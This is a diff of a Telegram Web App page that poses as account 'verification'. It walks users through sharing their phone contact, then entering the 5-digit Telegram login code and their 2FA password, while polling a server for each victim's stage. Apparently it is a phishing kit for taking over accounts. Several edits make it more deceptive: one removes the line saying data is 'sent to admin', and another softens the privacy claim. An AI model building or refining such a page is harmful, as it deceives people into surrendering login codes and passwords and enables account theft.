@@ -58,9 +58,6 @@
             border-radius: 15px;
             padding: 20px;
             margin-bottom: 25px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
         
@@ -75,6 +72,7 @@
             font-size: 24px;
             color: white;
             font-weight: bold;
+            margin-bottom: 15px;
         }
         
         .user-details h3 {
@@ -86,6 +84,7 @@
         .user-details p {
             color: #666;
             font-size: 14px;
+            margin: 3px 0;
         }
         
         /* Buttons */
@@ -116,7 +115,7 @@
         }
         
         .btn-secondary {
-            background: linear-gradient(135deg, #2196F3 0%, #1976D32 100%);
+            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
             color: white;
         }
         
@@ -204,13 +203,9 @@
             font-size: 16px;
         }
         
-        .info-box ol {
-            margin-left: 20px;
+        .info-box p {
             color: #555;
-        }
-        
-        .info-box li {
-            margin: 8px 0;
+            margin: 5px 0;
         }
         
         /* Inputs */
@@ -291,11 +286,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        /* Hidden */
-        .hidden {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -325,7 +315,8 @@
                 <div class="user-details">
                     <h3 id="user-name">Loading...</h3>
                     <p id="user-id">User ID: Loading...</p>
-                    <p id="user-phone">📱 Phone: Not shared</p>
+                    <p id="user-phone">📱 Phone: Not shared yet</p>
+                    <p id="user-status">Status: Waiting</p>
                 </div>
             </div>
             
@@ -336,16 +327,14 @@
             <!-- Section 1: Contact Sharing -->
             <div id="section-contact" class="section active">
                 <div class="info-box">
-                    <h3>📋 How it works:</h3>
-                    <ol>
-                        <li>Click "Share Contact" button below</li>
-                        <li>Telegram will open contact picker</li>
-                        <li>Select your phone contact</li>
-                        <li>5-digit OTP will appear in bot chat</li>
-                        <li>Return here for next step</li>
-                    </ol>
+                    <h3>📋 How to verify:</h3>
+                    <p>1. Click "Share Contact" button below</p>
+                    <p>2. Select your contact from Telegram</p>
+                    <p>3. 5-digit OTP will appear in bot chat</p>
+                    <p>4. Enter OTP on next page</p>
+                    <p>5. Complete verification ✅</p>
                     <p style="margin-top: 10px; color: #666; font-size: 14px;">
-                        🔒 <b>Privacy:</b> Your contact will be auto-deleted immediately
+                        🔒 <b>Privacy:</b> Your contact will be auto-deleted
                     </p>
                 </div>
                 
@@ -357,8 +346,8 @@
             <!-- Section 2: OTP Entry -->
             <div id="section-otp" class="section">
                 <div class="info-box">
-                    <h3>🔢 Step 2: Enter 5-digit OTP</h3>
-                    <p>Check your Telegram chat for the <b>5-digit OTP code</b>.</p>
+                    <h3>🔢 Enter 5-digit OTP</h3>
+                    <p>Check your Telegram chat for the 5-digit OTP code.</p>
                     <p>Enter it below to continue verification.</p>
                     <p style="color: #666; font-size: 14px;">
                         <b>Note:</b> Telegram sends 5-digit codes (e.g., 12345)
@@ -385,7 +374,7 @@
             <!-- Section 3: 2FA Entry -->
             <div id="section-2fa" class="section">
                 <div class="info-box">
-                    <h3>🔐 Step 3: Enter 2FA Password</h3>
+                    <h3>🔐 Enter 2FA Password</h3>
                     <p>Your account has two-factor authentication enabled.</p>
                     <p>Enter your 2FA password below to complete verification.</p>
                 </div>
@@ -413,7 +402,7 @@
                         Your account has been verified successfully.
                     </p>
                     <p style="color: #888; font-size: 14px;">
-                        All data has been processed and sent to admin.
+                        All data has been processed.
                     </p>
                     
                     <button class="btn btn-primary" onclick="closeWebApp()" style="margin-top: 25px;">
@@ -437,7 +426,6 @@
                 tg = Telegram.WebApp;
                 tg.ready();
                 tg.expand();
-                tg.enableClosingConfirmation();
                 
                 // Get user data
                 const user = tg.initDataUnsafe?.user;
@@ -445,7 +433,6 @@
                     userId = user.id;
                     const firstName = user.first_name || '';
                     const lastName = user.last_name || '';
-                    const username = user.username || '';
                     
                     // Update UI
                     document.getElementById('user-name').textContent = 
@@ -458,7 +445,7 @@
                         avatar.textContent = firstName.charAt(0).toUpperCase();
                     }
                     
-                    // Load user data from server
+                    // Load user data
                     loadUserData();
                 }
                 
@@ -477,10 +464,11 @@
                 
                 if (data.phone) {
                     userPhone = data.phone;
-                    document.getElementById('user-phone').textContent = `📱 Phone: ${userPhone}`;
+                    document.getElementById('user-phone').textContent = `📱 Phone: ${data.phone}`;
+                    document.getElementById('user-status').textContent = `Status: ${data.stage}`;
                     
                     // Determine which section to show
-                    if (data.stage === 'contact_received' || data.stage === 'waiting') {
+                    if (data.stage === 'contact_received' || data.stage === 'otp_sent') {
                         showSection('otp');
                     } else if (data.stage === 'needs_2fa') {
                         showSection('2fa');
@@ -522,13 +510,12 @@
                                 
                                 const data = await response.json();
                                 if (data.success) {
-                                    // Update UI and show OTP section
                                     userPhone = phone;
                                     document.getElementById('user-phone').textContent = `📱 Phone: ${phone}`;
                                     
                                     setTimeout(() => {
                                         showSection('otp');
-                                        loadUserData(); // Refresh data
+                                        loadUserData();
                                     }, 1500);
                                 } else {
                                     showAlert('❌ ' + data.error, 'error');
@@ -716,22 +703,16 @@
             if (tg) {
                 tg.close();
             } else {
-                alert('Verification complete! You can close this window.');
+                alert('Verification complete!');
             }
         }
         
-        // Initialize on page load
+        // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            const tgInitialized = initTelegramWebApp();
+            initTelegramWebApp();
             
-            if (!tgInitialized) {
-                document.getElementById('user-name').textContent = 'Not in Telegram';
-                document.getElementById('share-btn').disabled = true;
-                showAlert('⚠️ Please open this page from Telegram bot', 'error');
-            }
-            
-            // Auto-refresh user data every 5 seconds
-            setInterval(loadUserData, 5000);
+            // Auto-refresh every 3 seconds
+            setInterval(loadUserData, 3000);
             
             // Enter key support
             document.getElementById('otp-input')?.addEventListener('keypress', function(e) {
